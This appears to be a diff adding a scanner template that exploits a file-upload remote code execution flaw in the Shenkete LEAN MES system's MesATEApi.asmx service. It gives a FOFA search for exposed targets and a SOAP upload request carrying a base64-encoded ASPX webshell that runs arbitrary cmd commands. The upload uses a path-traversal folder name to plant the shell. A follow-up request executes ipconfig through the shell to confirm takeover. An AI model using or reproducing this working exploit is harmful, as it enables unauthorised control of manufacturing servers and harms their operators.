@@ -1,0 +1,56 @@
+## id: VEID-2026-11122
+## name: 深科特LEAN MES系统 MesATEApi.asmx 文件上传RCE漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,rce,veid2026
+## description: 深科特LEAN MES系统 MesATEApi.asmx 文件上传RCE漏洞，攻击者可通过上传恶意文件导致服务器被控制。
+## affects: 深科特LEAN MES系统
+## fofa-query: title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+## verification: true
+
+
+
+POST /WebService/MesATEApi.asmx HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: text/xml; charset=utf-8
+SOAPAction: "http://mesateapi.com/UploadFileToMES"
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <UploadFileToMES xmlns="http://mesateapi.com/">
+      <empNo>string</empNo>
+      <sn>string</sn>
+      <resource>string</resource>
+      <station>string</station>
+      <fileBytes>PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiIHZhbGlkYXRlUmVxdWVzdD0iZmFsc2UiICU+CjwlCnZhciBjPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbygiY21kIik7CnZhciBlPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcygpOwp2YXIgb3V0OlN5c3RlbS5JTy5TdHJlYW1SZWFkZXIsRUk6U3lzdGVtLklPLlN0cmVhbVJlYWRlcjsKYy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7CmMuUmVkaXJlY3RTdGFuZGFyZE91dHB1dD10cnVlOwpjLlJlZGlyZWN0U3RhbmRhcmRFcnJvcj10cnVlOwplLlN0YXJ0SW5mbz1jOwpjLkFyZ3VtZW50cz0iL2MgIiArIFJlcXVlc3QuSXRlbVsiY21kIl07CmUuU3RhcnQoKTsKb3V0PWUuU3RhbmRhcmRPdXRwdXQ7CkVJPWUuU3RhbmRhcmRFcnJvcjsKZS5DbG9zZSgpOwpSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkgKyBFSS5SZWFkVG9FbmQoKSk7ClN5c3RlbS5JTy5GaWxlLkRlbGV0ZShSZXF1ZXN0LlBoeXNpY2FsUGF0aCk7ClJlc3BvbnNlLkVuZCgpOyU+</fileBytes>
+      <folderName>/../ertyui</folderName>
+      <fileName>veil.aspx</fileName>
+    </UploadFileToMES>
+  </soap:Body>
+</soap:Envelope>
+
+
+#@ matcher: status_code == 200
+
+---
+
+GET /ertyui/veil.aspx?cmd=ipconfig HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ condition: and
+#@ matcher: header["Content-Type"] contains "html" 
+#@ matcher: body contains "Windows IP" && body contains "子网掩码"
+#@ matcher: status_code == 200
+
+
+
+
+
+
+
+
+# @VEIL-STAMP: 651c3aedc2bb63c887f64c248f966ae57765aa10c3289443b305c7c5af808421
